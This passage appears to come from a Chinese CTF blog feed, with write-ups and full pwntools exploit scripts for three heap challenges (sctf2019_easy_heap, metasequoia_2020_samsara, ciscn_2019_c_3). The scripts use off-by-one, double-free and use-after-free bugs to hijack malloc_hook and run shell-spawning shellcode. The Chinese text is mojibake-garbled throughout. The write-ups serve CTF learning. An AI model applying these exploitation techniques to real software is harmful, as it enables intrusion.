å°„åˆ°å†…å­˜ä¸­æŸä¸ªåœ°å€ï¼Œå¹¶æ‰“å°å‡ºæ¥ï¼Œå¾ˆæ˜æ˜¾è¿™é“é¢˜å¾—ç”¨shellcodeæ¥åšï¼Œè¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯è¿è¡Œï¼Œåé¢è¦ç”¨</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nFPj.png" alt="image-20231204213036915"></p><h5 id="addå‡½æ•°-ä¼šæ‰“å°å‡ºå †çš„åœ°å€"><a href="#addå‡½æ•°-ä¼šæ‰“å°å‡ºå †çš„åœ°å€" class="headerlink" title="addå‡½æ•°,ä¼šæ‰“å°å‡ºå †çš„åœ°å€"></a>addå‡½æ•°,ä¼šæ‰“å°å‡ºå †çš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/12/04/3np8e.png" alt="image-20231204213219796"></p><h5 id="fullå‡½æ•°ï¼Œèƒ½è¾“å…¥å†…å®¹åˆ°å †ä¸Š"><a href="#fullå‡½æ•°ï¼Œèƒ½è¾“å…¥å†…å®¹åˆ°å †ä¸Š" class="headerlink" title="fullå‡½æ•°ï¼Œèƒ½è¾“å…¥å†…å®¹åˆ°å †ä¸Š"></a>fullå‡½æ•°ï¼Œèƒ½è¾“å…¥å†…å®¹åˆ°å †ä¸Š</h5><p><img src="https://i.imgs.ovh/2023/12/04/3n3A3.png" alt="image-20231204213548121"></p><h5 id="æœ€åä¼šå¢æ·»ä¸€ä¸ªâ€™-x00â€™-å­˜åœ¨off-by-one-æ¼æ´"><a href="#æœ€åä¼šå¢æ·»ä¸€ä¸ªâ€™-x00â€™-å­˜åœ¨off-by-one-æ¼æ´" class="headerlink" title="æœ€åä¼šå¢æ·»ä¸€ä¸ªâ€™\x00â€™,å­˜åœ¨off by one æ¼æ´"></a>æœ€åä¼šå¢æ·»ä¸€ä¸ªâ€™\x00â€™,å­˜åœ¨off by one æ¼æ´</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nfs9.png" alt="image-20231204213619003"></p><h5 id="freeå‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæ¼æ´"><a href="#freeå‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæ¼æ´" class="headerlink" title="freeå‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæ¼æ´"></a>freeå‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæ¼æ´</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nWVH.png" alt="image-20231204213731793"></p><h5 id="å…ˆæ¥æ”¶mmapæ˜ å°„çš„åœ°å€"><a href="#å…ˆæ¥æ”¶mmapæ˜ å°„çš„åœ°å€" class="headerlink" title="å…ˆæ¥æ”¶mmapæ˜ å°„çš„åœ°å€"></a>å…ˆæ¥æ”¶mmapæ˜ å°„çš„åœ°å€</h5><pre><code class="lang-py">p.recvuntil(b&#39;Mmap: &#39;)vmap = p.recvline().strip()vmap = int(vmap, 16)print(&#39;vmap=&gt;&#39;+hex(vmap))</code></pre><h5 id="åšoff-by-oneè¿™ç§é¢˜çš„è¯ï¼Œæœ‰ä¸ªæŠ€å·§ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆç”³è¯·å››ä¸ªå †"><a href="#åšoff-by-oneè¿™ç§é¢˜çš„è¯ï¼Œæœ‰ä¸ªæŠ€å·§ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆç”³è¯·å››ä¸ªå †" class="headerlink" title="åšoff-by-oneè¿™ç§é¢˜çš„è¯ï¼Œæœ‰ä¸ªæŠ€å·§ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆç”³è¯·å››ä¸ªå †"></a>åšoff-by-oneè¿™ç§é¢˜çš„è¯ï¼Œæœ‰ä¸ªæŠ€å·§ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆç”³è¯·å››ä¸ªå †</h5><pre><code class="lang-py">add(0x410) #0add(0x68) #1add(0x4f0) #2add(0x68) #3</code></pre><h5 id="ç„¶åé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç„¶åå¡«å……ç¬¬ä¸€ä¸ªå †ï¼Œåˆ©ç”¨sub-E2Då‡½æ•°çš„è¾“å…¥æŠŠå †2çš„sizeä½æ”¹ä¸º0ï¼Œç„¶åé‡Šæ”¾å †2è¿›è¡Œunlinkæ“ä½œï¼Œç„¶åå †1ä¼šè¢«å¤¹åœ¨ä¸­é—´"><a href="#ç„¶åé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç„¶åå¡«å……ç¬¬ä¸€ä¸ªå †ï¼Œåˆ©ç”¨sub-E2Då‡½æ•°çš„è¾“å…¥æŠŠå †2çš„sizeä½æ”¹ä¸º0ï¼Œç„¶åé‡Šæ”¾å †2è¿›è¡Œunlinkæ“ä½œï¼Œç„¶åå †1ä¼šè¢«å¤¹åœ¨ä¸­é—´" class="headerlink" title="ç„¶åé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç„¶åå¡«å……ç¬¬ä¸€ä¸ªå †ï¼Œåˆ©ç”¨sub_E2Då‡½æ•°çš„è¾“å…¥æŠŠå †2çš„sizeä½æ”¹ä¸º0ï¼Œç„¶åé‡Šæ”¾å †2è¿›è¡Œunlinkæ“ä½œï¼Œç„¶åå †1ä¼šè¢«å¤¹åœ¨ä¸­é—´"></a>ç„¶åé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç„¶åå¡«å……ç¬¬ä¸€ä¸ªå †ï¼Œåˆ©ç”¨sub_E2Då‡½æ•°çš„è¾“å…¥æŠŠå †2çš„sizeä½æ”¹ä¸º0ï¼Œç„¶åé‡Šæ”¾å †2è¿›è¡Œunlinkæ“ä½œï¼Œç„¶åå †1ä¼šè¢«å¤¹åœ¨ä¸­é—´</h5><pre><code class="lang-py">free(0)payload=p64(0)*12+p64(0x490)fill(1,payload)</code></pre><p><img src="https://i.imgs.ovh/2023/12/04/3HLO5.png" alt="image-20231204220708856"></p><h5 id="é‡Šæ”¾å †2ï¼Œä¼šè¿›è¡Œunlink"><a href="#é‡Šæ”¾å †2ï¼Œä¼šè¿›è¡Œunlink" class="headerlink" title="é‡Šæ”¾å †2ï¼Œä¼šè¿›è¡Œunlink"></a>é‡Šæ”¾å †2ï¼Œä¼šè¿›è¡Œunlink</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H2lX.png" alt="image-20231204220956361"></p><h5 id="å†ç”³è¯·ä¸€æ¬¡0x410å’Œ0x68å¤§å°çš„å †ï¼Œå †2ä¼šå’Œå †1çš„ä½ç½®é‡åˆ"><a href="#å†ç”³è¯·ä¸€æ¬¡0x410å’Œ0x68å¤§å°çš„å †ï¼Œå †2ä¼šå’Œå †1çš„ä½ç½®é‡åˆ" class="headerlink" title="å†ç”³è¯·ä¸€æ¬¡0x410å’Œ0x68å¤§å°çš„å †ï¼Œå †2ä¼šå’Œå †1çš„ä½ç½®é‡åˆ"></a>å†ç”³è¯·ä¸€æ¬¡0x410å’Œ0x68å¤§å°çš„å †ï¼Œå †2ä¼šå’Œå †1çš„ä½ç½®é‡åˆ</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H6lu.png" alt="image-20231204223334972"></p><h5 id="å†deleteå‡ æ¬¡ï¼Œç›¸å½“äºdouble-freeäº†å †2"><a href="#å†deleteå‡ æ¬¡ï¼Œç›¸å½“äºdouble-freeäº†å †2" class="headerlink" title="å†deleteå‡ æ¬¡ï¼Œç›¸å½“äºdouble freeäº†å †2"></a>å†deleteå‡ æ¬¡ï¼Œç›¸å½“äºdouble freeäº†å †2</h5><pre><code class="lang-py">delete(3)delete(1) #1=&gt;#3 delete(2) #2(1)=&gt;1</code></pre><p><img src="https://i.imgs.ovh/2023/12/04/3H3Qp.png" alt="image-20231204223004490"></p><h5 id="æ¥ä¸‹æ¥æ”¹biné“¾æŒ‡é’ˆæˆæ”¹æˆvmapçš„ï¼Œå†™ä¸Šshellcode"><a href="#æ¥ä¸‹æ¥æ”¹biné“¾æŒ‡é’ˆæˆæ”¹æˆvmapçš„ï¼Œå†™ä¸Šshellcode" class="headerlink" title="æ¥ä¸‹æ¥æ”¹biné“¾æŒ‡é’ˆæˆæ”¹æˆvmapçš„ï¼Œå†™ä¸Šshellcode"></a>æ¥ä¸‹æ¥æ”¹biné“¾æŒ‡é’ˆæˆæ”¹æˆvmapçš„ï¼Œå†™ä¸Šshellcode</h5><p><img src="https://i.imgs.ovh/2023/12/06/3gchT.png" alt="image-20231206200052135"></p><h5 id="ä¸Šé¢çš„è¯å †2æ˜¯æ²¡æœ‰freeçš„ï¼Œç„¶åç”¨ä¸Šé¢çš„æ–¹å¼å†unlinkä¸€æ¬¡ï¼Œå†add0x410å¤§å°çš„å †ï¼Œä¼šåœ¨å †2çš„fdæŒ‡é’ˆä¸Šæœ‰main-arena-96çš„åœ°å€ã€‚"><a href="#ä¸Šé¢çš„è¯å †2æ˜¯æ²¡æœ‰freeçš„ï¼Œç„¶åç”¨ä¸Šé¢çš„æ–¹å¼å†unlinkä¸€æ¬¡ï¼Œå†add0x410å¤§å°çš„å †ï¼Œä¼šåœ¨å †2çš„fdæŒ‡é’ˆä¸Šæœ‰main-arena-96çš„åœ°å€ã€‚" class="headerlink" title="ä¸Šé¢çš„è¯å †2æ˜¯æ²¡æœ‰freeçš„ï¼Œç„¶åç”¨ä¸Šé¢çš„æ–¹å¼å†unlinkä¸€æ¬¡ï¼Œå†add0x410å¤§å°çš„å †ï¼Œä¼šåœ¨å †2çš„fdæŒ‡é’ˆä¸Šæœ‰main_arena+96çš„åœ°å€ã€‚"></a>ä¸Šé¢çš„è¯å †2æ˜¯æ²¡æœ‰freeçš„ï¼Œç„¶åç”¨ä¸Šé¢çš„æ–¹å¼å†unlinkä¸€æ¬¡ï¼Œå†add0x410å¤§å°çš„å †ï¼Œä¼šåœ¨å †2çš„fdæŒ‡é’ˆä¸Šæœ‰main_arena+96çš„åœ°å€ã€‚</h5><pre><code class="lang-py">fill(1,payload) delete(1)delete(4) #unlinkadd(0x410) # 0</code></pre><p><img src="https://i.imgs.ovh/2023/12/09/feBe9.png" alt="image-20231209222142417"></p><h5 id="fillå †2ä¸€ä¸ªå­—èŠ‚ï¼Œå°†å…¶æ”¹ä¸º0x30ï¼Œæ—¢æ˜¯mallloc-hookçš„åœ°å€"><a href="#fillå †2ä¸€ä¸ªå­—èŠ‚ï¼Œå°†å…¶æ”¹ä¸º0x30ï¼Œæ—¢æ˜¯mallloc-hookçš„åœ°å€" class="headerlink" title="fillå †2ä¸€ä¸ªå­—èŠ‚ï¼Œå°†å…¶æ”¹ä¸º0x30ï¼Œæ—¢æ˜¯mallloc_hookçš„åœ°å€"></a>fillå †2ä¸€ä¸ªå­—èŠ‚ï¼Œå°†å…¶æ”¹ä¸º0x30ï¼Œæ—¢æ˜¯mallloc_hookçš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/12/09/feIGO.png" alt="image-20231209222512116"></p><h5 id="å†malloc0x68ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡å†™ä¸Švmapçš„åœ°å€-å†ä»»æ„ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ"><a href="#å†malloc0x68ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡å†™ä¸Švmapçš„åœ°å€-å†ä»»æ„ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ" class="headerlink" title="å†malloc0x68ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡å†™ä¸Švmapçš„åœ°å€,å†ä»»æ„ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ"></a>å†malloc0x68ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡å†™ä¸Švmapçš„åœ°å€,å†ä»»æ„ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ</h5><pre><code class="lang-py">add(0x68) #1fill(1,p64(vmap)) # 4add(0x68) #4fill(4,p64(vmap))add(0x20)</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28038)p=process(&quot;./sctf2019_easy_heap&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)context.arch=&#39;amd64&#39;#context=arch(&#39;amd64&#39;)def add(size):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))def fill(index,content):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index:&#39;,str(index))    p.sendlineafter(&#39;Content:&#39;,content)def delete(index):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))p.recvuntil(b&#39;Mmap: &#39;)vmap = p.recvline().strip()vmap = int(vmap, 16)print(&#39;vmap=&gt;&#39;+hex(vmap))add(0x410) #0add(0x68) #1add(0x4f0) #2add(0x68) #3payload=p64(0)*12+p64(0x490)delete(0)fill(1,payload)delete(2)add(0x410) #0add(0x68)  #2 lead to chunk1delete(3)delete(1) #1=&gt;3delete(2) #1=&gt;1 in the similar case we use by UAF,but it is not.add(0x68) #1fill(1,p64(vmap))add(0x68) #2add(0x68) #3shellcode=asm(shellcraft.sh())fill(3,shellcode)add(0x4f0) #4delete(0) #free 0x410fill(1,payload) delete(1)delete(4) #unlinkadd(0x410) # 0gdb.attach(p)sleep(1)pause()fill(2,&#39;\x30&#39;)add(0x68) #1fill(1,p64(vmap)) # 4add(0x68) #4fill(4,p64(vmap))add(0x20)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>metasequoia_2020_samsara</title>
      <link href="/2023/12/03/metasequoia-2020-samsara/"/>
      <url>/2023/12/03/metasequoia-2020-samsara/</url>
      
        <content type="html"><![CDATA[<h5 id="ä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†"><a href="#ä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†" class="headerlink" title="ä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†"></a>ä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†</h5><h5 id="ç¨‹åºæŒºç®€å•çš„ï¼Œèœå•ç›´æ¥æ”¾å‡ºæ¥äº†ï¼Œå­˜åœ¨double-freeæ¼æ´ï¼Œåªéœ€è¦è®©v8-0xdeadbeefå°±èƒ½æ‹¿åˆ°flag"><a href="#ç¨‹åºæŒºç®€å•çš„ï¼Œèœå•ç›´æ¥æ”¾å‡ºæ¥äº†ï¼Œå­˜åœ¨double-freeæ¼æ´ï¼Œåªéœ€è¦è®©v8-0xdeadbeefå°±èƒ½æ‹¿åˆ°flag" class="headerlink" title="ç¨‹åºæŒºç®€å•çš„ï¼Œèœå•ç›´æ¥æ”¾å‡ºæ¥äº†ï¼Œå­˜åœ¨double freeæ¼æ´ï¼Œåªéœ€è¦è®©v8=0xdeadbeefå°±èƒ½æ‹¿åˆ°flag"></a>ç¨‹åºæŒºç®€å•çš„ï¼Œèœå•ç›´æ¥æ”¾å‡ºæ¥äº†ï¼Œå­˜åœ¨double freeæ¼æ´ï¼Œåªéœ€è¦è®©v8=0xdeadbeefå°±èƒ½æ‹¿åˆ°flag</h5><p><img src="https://i.imgs.ovh/2023/12/03/wSene.png" alt=""></p><h5 id="å…ˆdouble-free-ç„¶åç”¨case4æ‰“å°å‡ºv7çš„åœ°å€ï¼Œåœ¨æ ˆä¸Šv8çš„åœ°å€ç­‰äºv7-0x8-double-freeæ”¹åœ°å€çš„æ—¶å€™æ”¹åˆ°v7-0x8-ç„¶åv7çš„å€¼å¾—æ˜¯0x20ï¼Œæ„é€ fakechunkï¼Œç„¶åmallocçš„æ—¶å€™åœ¨v7-0x8-0x10çš„åœ°æ–¹å†™ä¸Š0xdeadbeef"><a href="#å…ˆdouble-free-ç„¶åç”¨case4æ‰“å°å‡ºv7çš„åœ°å€ï¼Œåœ¨æ ˆä¸Šv8çš„åœ°å€ç­‰äºv7-0x8-double-freeæ”¹åœ°å€çš„æ—¶å€™æ”¹åˆ°v7-0x8-ç„¶åv7çš„å€¼å¾—æ˜¯0x20ï¼Œæ„é€ fakechunkï¼Œç„¶åmallocçš„æ—¶å€™åœ¨v7-0x8-0x10çš„åœ°æ–¹å†™ä¸Š0xdeadbeef" class="headerlink" title="å…ˆdouble free,ç„¶åç”¨case4æ‰“å°å‡ºv7çš„åœ°å€ï¼Œåœ¨æ ˆä¸Šv8çš„åœ°å€ç­‰äºv7+0x8,double freeæ”¹åœ°å€çš„æ—¶å€™æ”¹åˆ°v7-0x8,ç„¶åv7çš„å€¼å¾—æ˜¯0x20ï¼Œæ„é€ fakechunkï¼Œç„¶åmallocçš„æ—¶å€™åœ¨v7-0x8+0x10çš„åœ°æ–¹å†™ä¸Š0xdeadbeef"></a>å…ˆdouble free,ç„¶åç”¨case4æ‰“å°å‡ºv7çš„åœ°å€ï¼Œåœ¨æ ˆä¸Šv8çš„åœ°å€ç­‰äºv7+0x8,double freeæ”¹åœ°å€çš„æ—¶å€™æ”¹åˆ°v7-0x8,ç„¶åv7çš„å€¼å¾—æ˜¯0x20ï¼Œæ„é€ fakechunkï¼Œç„¶åmallocçš„æ—¶å€™åœ¨v7-0x8+0x10çš„åœ°æ–¹å†™ä¸Š0xdeadbeef</h5><p><img src="https://i.imgs.ovh/2023/12/03/wukUH.png" alt="image-20231203164238201"></p><p><img src="https://i.imgs.ovh/2023/12/03/wu1MT.png" alt="image-20231203165112607"></p><h5 id="å¼€å§‹çš„æ—¶å€™å¾—å¤šç”³è¯·ä¸€ä¸ªå †å †3ï¼Œå…¶ä»–å¸ˆå‚…è¯´é˜²æ­¢free-æ‰çš„ä¸¤ä¸ªchunkå’Œtop-chunkåˆå¹¶ï¼Œè„šæœ¬è·‘çš„è¯æ²¡é€ï¼Œä½†ä»¥åè¿˜æ˜¯å¾—æ³¨æ„"><a href="#å¼€å§‹çš„æ—¶å€™å¾—å¤šç”³è¯·ä¸€ä¸ªå †å †3ï¼Œå…¶ä»–å¸ˆå‚…è¯´é˜²æ­¢free-æ‰çš„ä¸¤ä¸ªchunkå’Œtop-chunkåˆå¹¶ï¼Œè„šæœ¬è·‘çš„è¯æ²¡é€ï¼Œä½†ä»¥åè¿˜æ˜¯å¾—æ³¨æ„" class="headerlink" title="å¼€å§‹çš„æ—¶å€™å¾—å¤šç”³è¯·ä¸€ä¸ªå †å †3ï¼Œå…¶ä»–å¸ˆå‚…è¯´é˜²æ­¢free æ‰çš„ä¸¤ä¸ªchunkå’Œtop chunkåˆå¹¶ï¼Œè„šæœ¬è·‘çš„è¯æ²¡é€ï¼Œä½†ä»¥åè¿˜æ˜¯å¾—æ³¨æ„"></a>å¼€å§‹çš„æ—¶å€™å¾—å¤šç”³è¯·ä¸€ä¸ªå †å †3ï¼Œå…¶ä»–å¸ˆå‚…è¯´é˜²æ­¢free æ‰çš„ä¸¤ä¸ªchunkå’Œtop chunkåˆå¹¶ï¼Œè„šæœ¬è·‘çš„è¯æ²¡é€ï¼Œä½†ä»¥åè¿˜æ˜¯å¾—æ³¨æ„</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28766)p=process(&quot;./metasequoia_2020_samsara&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)def add():    p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;)def free(index):    p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index&#39;,str(index))def full(index,content):    p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index&#39;,str(index))    p.sendlineafter(&#39;Ingredient:&#39;,content)def show():    p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;)def move(content):    p.sendlineafter(&#39;choice &gt; &#39;,&#39;5&#39;)    p.sendlineafter(&#39;Which kingdom?&#39;,content)add() #0add() #1add() #2free(0)free(1)free(0)show()p.recvuntil(&#39;Your lair is at: &#39;)addr=int(p.recv(14),16)#addr = int(p.recvuntil(&#39;\n&#39;, drop=True), 16)print(&#39;addr=&gt;&#39;+hex(addr))move(str(0x20))gdb.attach(p)pause()#sleep(1)v8=addr-0x8add() #3full(3,str(v8))add() #4add() #5add() #6full(6,str(0xdeadbeef))p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_3</title>
      <link href="/2023/11/27/ciscn-2019-c-3/"/>
      <url>/2023/11/27/ciscn-2019-c-3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgs.ovh/2023/11/27/pnlWA.png" alt="image-20231127212242738"></p><h5 id="å¼€å¯äº†å…¨å±€åç§»"><a href="#å¼€å¯äº†å…¨å±€åç§»" class="headerlink" title="å¼€å¯äº†å…¨å±€åç§»"></a>å¼€å¯äº†å…¨å±€åç§»</h5><h5 id="addå‡½æ•°ï¼Œåªå…è®¸ç”³è¯·å›ºå®šçš„å‡ ä¸ªå¤§å°çš„å †ï¼Œåœ¨å †åœ°å€-16çš„åœ°æ–¹å†™å…¥å†…å®¹ï¼Œæ‰€ä»¥æ”¹ä¸äº†fdå’Œbkåœ°å€ï¼Œå †åœ°å€å¼€å§‹å†™ä¸Š0ï¼Œå †åœ°å€-8çš„åœ°å€ä¼šåŠ ä¸Šéšæœºæ•°"><a href="#addå‡½æ•°ï¼Œåªå…è®¸ç”³è¯·å›ºå®šçš„å‡ ä¸ªå¤§å°çš„å †ï¼Œåœ¨å †åœ°å€-16çš„åœ°æ–¹å†™å…¥å†…å®¹ï¼Œæ‰€ä»¥æ”¹ä¸äº†fdå’Œbkåœ°å€ï¼Œå †åœ°å€å¼€å§‹å†™ä¸Š0ï¼Œå †åœ°å€-8çš„åœ°å€ä¼šåŠ ä¸Šéšæœºæ•°" class="headerlink" title="addå‡½æ•°ï¼Œåªå…è®¸ç”³è¯·å›ºå®šçš„å‡ ä¸ªå¤§å°çš„å †ï¼Œåœ¨å †åœ°å€+16çš„åœ°æ–¹å†™å…¥å†…å®¹ï¼Œæ‰€ä»¥æ”¹ä¸äº†fdå’Œbkåœ°å€ï¼Œå †åœ°å€å¼€å§‹å†™ä¸Š0ï¼Œå †åœ°å€+8çš„åœ°å€ä¼šåŠ ä¸Šéšæœºæ•°"></a>addå‡½æ•°ï¼Œåªå…è®¸ç”³è¯·å›ºå®šçš„å‡ ä¸ªå¤§å°çš„å †ï¼Œåœ¨å †åœ°å€+16çš„åœ°æ–¹å†™å…¥å†…å®¹ï¼Œæ‰€ä»¥æ”¹ä¸äº†fdå’Œbkåœ°å€ï¼Œå †åœ°å€å¼€å§‹å†™ä¸Š0ï¼Œå †åœ°å€+8çš„åœ°å€ä¼šåŠ ä¸Šéšæœºæ•°</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnne5.png" alt="image-20231127212332956"></p><h5 id="showå‡½æ•°ï¼Œä¼šæŠŠå †åœ°å€ä¸Šçš„å‡ ä¸ªæ•°åˆ†åˆ«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥æ‰“å°å‡ºmain-arena-96çš„åœ°å€"><a href="#showå‡½æ•°ï¼Œä¼šæŠŠå †åœ°å€ä¸Šçš„å‡ ä¸ªæ•°åˆ†åˆ«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥æ‰“å°å‡ºmain-arena-96çš„åœ°å€" class="headerlink" title="showå‡½æ•°ï¼Œä¼šæŠŠå †åœ°å€ä¸Šçš„å‡ ä¸ªæ•°åˆ†åˆ«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥æ‰“å°å‡ºmain_arena+96çš„åœ°å€"></a>showå‡½æ•°ï¼Œä¼šæŠŠå †åœ°å€ä¸Šçš„å‡ ä¸ªæ•°åˆ†åˆ«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥æ‰“å°å‡ºmain_arena+96çš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnhGT.png" alt="image-20231127213053713"></p><h5 id="deleteå‡½æ•°ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„UAFæ¼æ´"><a href="#deleteå‡½æ•°ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„UAFæ¼æ´" class="headerlink" title="deleteå‡½æ•°ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„UAFæ¼æ´"></a>deleteå‡½æ•°ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„UAFæ¼æ´</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnb8d.png" alt="image-20231127213159824"></p><h5 id="è¿˜æœ‰ä¸ªåé¢å‡½æ•°ï¼Œå¯ä»¥æ”¹å †fdä½ç½®çš„ä¸œè¥¿ï¼Œæ¯æ¬¡èƒ½ä½¿å…¶åŠ ä¸€ï¼Œåé¢èƒ½æ”¹å…¶binæŒ‡é’ˆ"><a href="#è¿˜æœ‰ä¸ªåé¢å‡½æ•°ï¼Œå¯ä»¥æ”¹å †fdä½ç½®çš„ä¸œè¥¿ï¼Œæ¯æ¬¡èƒ½ä½¿å…¶åŠ ä¸€ï¼Œåé¢èƒ½æ”¹å…¶binæŒ‡é’ˆ" class="headerlink" title="è¿˜æœ‰ä¸ªåé¢å‡½æ•°ï¼Œå¯ä»¥æ”¹å †fdä½ç½®çš„ä¸œè¥¿ï¼Œæ¯æ¬¡èƒ½ä½¿å…¶åŠ ä¸€ï¼Œåé¢èƒ½æ”¹å…¶binæŒ‡é’ˆ"></a>è¿˜æœ‰ä¸ªåé¢å‡½æ•°ï¼Œå¯ä»¥æ”¹å †fdä½ç½®çš„ä¸œè¥¿ï¼Œæ¯æ¬¡èƒ½ä½¿å…¶åŠ ä¸€ï¼Œåé¢èƒ½æ”¹å…¶binæŒ‡é’ˆ</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnSAK.png" alt="image-20231127213350417"></p><h5 id="å…ˆmallocå¤§å°ä¸º0x100çš„å †ï¼Œç„¶åé‡Šæ”¾8æ¬¡ï¼Œç„¶åbinæ‰ä¼šæœ‰main-arena-96-ä¸”å¾—å…ˆmallocå¤§å°æ˜¯0x100å¤§å°çš„å †"><a href="#å…ˆmallocå¤§å°ä¸º0x100çš„å †ï¼Œç„¶åé‡Šæ”¾8æ¬¡ï¼Œç„¶åbinæ‰ä¼šæœ‰main-arena-96-ä¸”å¾—å…ˆmallocå¤§å°æ˜¯0x100å¤§å°çš„å †" class="headerlink" title="å…ˆmallocå¤§å°ä¸º0x100çš„å †ï¼Œç„¶åé‡Šæ”¾8æ¬¡ï¼Œç„¶åbinæ‰ä¼šæœ‰main_arena+96,ä¸”å¾—å…ˆmallocå¤§å°æ˜¯0x100å¤§å°çš„å †"></a>å…ˆmallocå¤§å°ä¸º0x100çš„å †ï¼Œç„¶åé‡Šæ”¾8æ¬¡ï¼Œç„¶åbinæ‰ä¼šæœ‰main_arena+96,ä¸”å¾—å…ˆmallocå¤§å°æ˜¯0x100å¤§å°çš„å †</h5><pre><code class="lang-py">add(0x100,&#39;aaaa&#39;) #0add(0x60,&#39;bbbb&#39;) #1for i in range(8):    delete(0)</code></pre><p><img src="https://i.imgs.ovh/2023/11/27/pnJD3.png" alt="image-20231127215520780"></p><h5 id="ç„¶åshowçš„è¯èƒ½æ¥æ”¶åˆ°å…¶åœ°å€"><a href="#ç„¶åshowçš„è¯èƒ½æ¥æ”¶åˆ°å…¶åœ°å€" class="headerlink" title="ç„¶åshowçš„è¯èƒ½æ¥æ”¶åˆ°å…¶åœ°å€"></a>ç„¶åshowçš„è¯èƒ½æ¥æ”¶åˆ°å…¶åœ°å€</h5><pre><code class="lang-py">show(0)p.recvuntil(&quot;attack_times: &quot;)#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))</code></pre><pre><code class="lang-py">malloc_hook=arena_96-96-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]gadget=base+one_gadget</code></pre><h5 id="å†ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿™æ—¶å€™ä¼šåœ¨å †2å¼€å§‹-ç”±äºglibc-2-27çš„ç‰¹æ€§ï¼Œä¼šåœ¨å¼€å§‹çš„ä¸Šæ–¹ç”³è¯·å †ï¼Œè¿™é‡Œä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨free-hook-0x10çš„åœ°å€ï¼Œè€Œä¸æ˜¯free-hook"><a href="#å†ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿™æ—¶å€™ä¼šåœ¨å †2å¼€å§‹-ç”±äºglibc-2-27çš„ç‰¹æ€§ï¼Œä¼šåœ¨å¼€å§‹çš„ä¸Šæ–¹ç”³è¯·å †ï¼Œè¿™é‡Œä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨free-hook-0x10çš„åœ°å€ï¼Œè€Œä¸æ˜¯free-hook" class="headerlink" title="å†ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿™æ—¶å€™ä¼šåœ¨å †2å¼€å§‹,ç”±äºglibc 2.27çš„ç‰¹æ€§ï¼Œä¼šåœ¨å¼€å§‹çš„ä¸Šæ–¹ç”³è¯·å 